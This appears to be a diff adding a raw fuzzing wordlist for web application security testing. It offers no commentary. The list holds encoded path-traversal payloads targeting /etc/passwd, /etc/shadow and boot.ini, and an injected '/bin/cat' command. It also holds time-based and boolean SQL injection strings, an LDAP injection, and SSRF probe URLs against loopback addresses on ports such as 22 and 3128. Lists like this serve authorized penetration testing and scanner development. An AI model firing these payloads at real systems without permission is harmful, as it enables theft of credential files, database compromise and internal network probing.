@@ -1,0 +1,78 @@
+/.../.../.../.../.../
+\…..\\\…..\\\…..\\\
+%00../../../../../../etc/passwd
+%00/etc/passwd%00
+%00../../../../../../etc/shadow
+%00/etc/shadow%00
+%0a/bin/cat%20/etc/passwd
+%0a/bin/cat%20/etc/shadow
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%  25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%00
+%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%    25%5c..%25%5c..%255cboot.ini
+/%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..%25%5c..winnt/desktop.ini
+/../../../../../../../../%2A
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/shadow
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/shadow
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
+=3D “/..” . “%2f..
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+admin/access_log
+/admin/install.php
+../../../administrator/inbox
+/apache2/logs/access_log
+/apache2/logs/access.log
+/apache2/logs/error_log
+/apache2/logs/error.log
+/apache/logs/access_log
+/apache/logs/access.log
+../../../../../apache/logs/access.log
+../../../../apache/logs/access.log
+../../../apache/logs/access.log
+../../apache/logs/access.log
+../apache/logs/access.log
+/apache/logs/error_log
+)%20or%20('x'='x
+%20or%201=1
+; execute immediate 'sel' || 'ect us' || 'er'
+benchmark(10000000,MD5(1))#
+";waitfor delay '0:0:__TIME__'--
+1) or pg_sleep(__TIME__)--
+||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+hi"""") or (""""a""""=""""a"""
+" or sleep(__TIME__)#
+pg_sleep(__TIME__)--
+*(|(objectclass=*))
+declare @q nvarchar (200) 0x730065006c00650063 ...
+ or 0=0 #
+1) or sleep(__TIME__)#
+) or ('a'='a
+; exec xp_regread
+@var select @var as var into temp end --
+1)) or benchmark(10000000,MD5(1))#
+(||6)
+a"""" or 3=3--"""
+http://localhost:80
+http://localhost:443
+http://localhost:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+https://127.0.0.1/
+https://localhost/
+http://[::]:80/
+http://[::]:25/
+http://[::]:22/
+http://[::]:3128/
+http://0000::1:80/
+http://0000::1:25/
